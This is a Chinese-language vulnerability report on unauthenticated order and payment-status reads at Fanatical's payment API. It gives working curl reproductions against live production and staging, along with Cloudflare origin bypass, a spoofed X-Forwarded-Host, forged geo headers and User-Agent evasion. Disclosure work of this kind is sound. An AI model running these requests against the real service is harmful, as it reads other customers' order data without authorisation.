# Fanatical 支付查询端点未鉴权按 orderId 读取订单与支付状态（生产 www/admin + apistaging）

## 结论

Fanatical 的支付查询端点不校验会话、Authorization 或订单归属。只要有一个存在的 24 位 hex orderId（MongoDB ObjectId），就能读取订单 JSON 与支付状态：

- `POST /api/payment/get-checkout`，JSON body `{"orderId":"<24位hex>"}` → 200，返回 order 脱敏视图（`_id` / `aid` / `items` / 金额 / `status` / `epayId`）
- `GET /api/payment/get-payment-details/<orderId>` → 200，返回支付状态（`open`/`unpaid`、`complete`/`paid`；staging 付费单还带 `payment_intent_id`）

**生产已活体坐实**：`www.fanatical.com`（经 Cloudflare 公网）与 `admin.fanatical.com`（源站直连，同一个 Heroku app）两条通路均 200，读取请求全程无 Authorization / Cookie，`anonid` 可为任意 UUIDv4（与订单无关）。
apistaging 侧此前已实证跨用户读取（读到他用户订单 6af5862d…）。

## 前置条件

1. 一个存在的 24 位 hex orderId。来源：自己下单的 create-order 响应、支付回调/前端记录、邮件链接、Wayback 归档。**不可盲枚举**（见「影响边界」）。
2. 无需账号 / Cookie / Authorization。`anonid` 任意合法 UUIDv4 即可；`CF-IPCountry: US` 用于避免地域风控。
3. 浏览器类 User-Agent（`$ARTEX_UA`）；裸 curl UA 可能被边缘拦。
4. 源站直连时：`nslookup` 现取 Heroku GA IP（会变，本次 3.33.161.45），curl 必须 `--noproxy '*'` + `--resolve`，否则代理会让 `--resolve` 失效、请求回到 Cloudflare。
5. staging 需额外带任意 `X-Forwarded-Host` 过 Host 门禁。

## 复现 A：生产公网（经 Cloudflare，首选）

```bash
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36}"
ANON=$(cat /proc/sys/kernel/random/uuid)
ORDER=6af5ad14c664a14eae407761    # 替换为已知存在的 orderId

# 1) 订单详情（无 Authorization / Cookie）
curl -sk --noproxy '*' -A "$UA" \
  -H "anonid: $ANON" -H 'CF-IPCountry: US' -H 'Content-Type: application/json' \
  -X POST -d "{\"orderId\":\"$ORDER\"}" \
  https://www.fanatical.com/api/payment/get-checkout

# 2) 支付状态
curl -sk --noproxy '*' -A "$UA" \
  -H "anonid: $ANON" -H 'CF-IPCountry: US' \
  https://www.fanatical.com/api/payment/get-payment-details/$ORDER
```

实测回显（2026-11-12 12:12 UTC）：

`POST get-checkout` → HTTP 200 / 2064B：

```json
{"order":{"_id":"6af5ad14c664a14eae407761","aid":"dbea5b79-9d94-496f-b937-05aa4c72e5f5","items":[{"_id":"661d479cc0180a098845ead7","name":"Xbox Digital Gift Card (US) - $10","epayId":4251404501594,"payment":{"total":1040}}],"payment":{"status":"INITIALISED","total":1040},"status":"INITIALISED"},"recheck":true}
```

`GET get-payment-details/6af5ad14…` → HTTP 200 / 43B：

```json
{"status":"open","payment_status":"unpaid"}
```

## 复现 B：生产源站直连（绕 CF，证明缺陷在应用层）

```bash
IP=$(nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1 | awk '/^Address: /{print $2; exit}')
curl -sk --noproxy '*' --resolve admin.fanatical.com:443:$IP -A "$UA" \
  -H 'Host: admin.fanatical.com' -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
  -H 'CF-IPCountry: US' -H 'Content-Type: application/json' \
  -X POST -d "{\"orderId\":\"$ORDER\"}" \
  https://admin.fanatical.com/api/payment/get-checkout
```

实测 → HTTP 200 / 2064B，同一订单 JSON，仍然没有任何 Authorization。说明未鉴权是应用路由本身的行为，不是 CF 边缘配置。

## 复现 C：apistaging（跨用户读取已坐实）

```bash
IP=$(nslookup -type=A apistaging.fanatical.com.herokudns.com 1.1.1.1 | awk '/^Address: /{print $2; exit}')
# Host 门禁：必须带任意 X-Forwarded-Host，否则 403 "The api must be accessed through https://staging.fanatical.com/api"
curl -sk --noproxy '*' --resolve apistaging.fanatical.com:443:$IP -A "$UA" \
  -H 'X-Forwarded-Host: attacker.com' -H "anonid: $ANON" \
  -H 'Content-Type: application/json' \
  -X POST -d '{"orderId":"6af5862d143448c180cf3ad8"}' \
  https://apistaging.fanatical.com/api/payment/get-checkout

curl -sk --noproxy '*' --resolve apistaging.fanatical.com:443:$IP -A "$UA" \
  -H 'X-Forwarded-Host: attacker.com' -H "anonid: $ANON" \
  https://apistaging.fanatical.com/api/payment/get-payment-details/6af5862d143448c180cf3ad8
```

实测（2026-11-12）：get-checkout → 200 / 1961B，完整订单（items=[Mystery Game Bundle - 2 Games]、payment.total=189、status=COMPLETE）；get-payment-details → 200 / 131B `{"status":"complete","payment_status":"paid","payment_intent_id":"pi_3UauTJ…<REDACTED>","payment_intent_status":"succeeded"}`。
跨用户判据：该 orderId 出现在另一登录用户（uid=6af4d16b…）的 `GET /api/user/orders` 列表中，而读取请求不带该用户任何 token/cookie，anonid 为随机且与该用户无关的 UUIDv4。

## 判据（缺一不可）

1. `get-checkout` 200 且 `order._id` == 请求 orderId，含 `aid` / `items` / `payment.total` / `status`。
2. `get-payment-details` 200 且含 `status` / `payment_status`（staging 付费单含 `payment_intent_id` / `payment_intent_status`）。
3. 阴性对照：不存在的 24 位 hex → `get-checkout` 404 `{"note":"NO_ORDER_FOUND"}`（生产实测为 `{"err":"NO_ORDER_FOUND"}`）、`get-payment-details` 400 `{"error":"PGD002","message":"Order not found"}`。若任何随机 orderId 都 200，说明命中 SPA 兜底/缓存，结论不成立。
4. 零凭据：去掉 Authorization / Cookie 仍 200。
5. 跨用户：同一 orderId 出现在他人登录态 `/api/user/orders` 列表，而读取端无该用户凭据。

## 影响边界

- 响应是**脱敏订单视图**：无 `uid`、billing、收货地址、序列号、礼卡码（`keys` 为空、`user/orders` 为空、`user/orders/{id}` 404）。
- orderId 为 ObjectId，**不可枚举/不可批量**：以已知 orderId 固定前 18 hex、末 3 字节 ±100 的 200 次邻域探测全部 404（25B `{"err":"NO_ORDER_FOUND"}`），未命中他人订单。
- 生产只命中活体/近期订单；归档 orderId 全部 404（早期用 4 个 Wayback 归档 ID 复测均 404）。所以要先自己下一单或拿到近期 orderId。
- 实际影响：已知单号的订单元数据（商品、金额、aid、epayId）与支付状态泄露，无 PII、无兑换码，故定级 low。

## 前置：自己下单拿活体 orderId（非漏洞步骤）

```bash
# 需真实顾客 Bearer（已脱敏）；仅用于生成一个可读的活体 orderId
curl -sk --noproxy '*' --resolve admin.fanatical.com:443:$IP -A "$UA" \
  -H 'Host: admin.fanatical.com' -H "anonid: <自己的 UUIDv4>" -H 'CF-IPCountry: US' \
  -H 'Authorization: Bearer <REDACTED>' -H 'Content-Type: application/json' \
  -X POST -d '{"snowplowId":"","snowplowSessionId":"","ref_code":"","locale":"en","giftOrder":null,"localNewsletterConsent":false,"attribution":{}}' \
  https://admin.fanatical.com/api/user/payment/create-order
# 实测 → HTTP 200 / 3138B，orderId=6af5ad14c664a14eae407761，status=INITIALISED，payment.total=1040（USD）
```

## 常见失败

- 403 `The api must be accessed through https://staging.fanatical.com/api`：缺 `X-Forwarded-Host`，或请求落到了 Cloudflare（检查 `--noproxy '*'` 与 `--resolve`）。
- 404 `NO_ORDER_FOUND`：orderId 不存在或已清理；重新下一单取新 orderId（生产只认活体单）。
- 200 但空对象/HTML：打到了 SPA 兜底或 CDN 缓存，不是访问控制验证证据。
- 401/403 缺失 anonid 或 UA 太像脚本：换浏览器类 UA + 合法 UUIDv4。
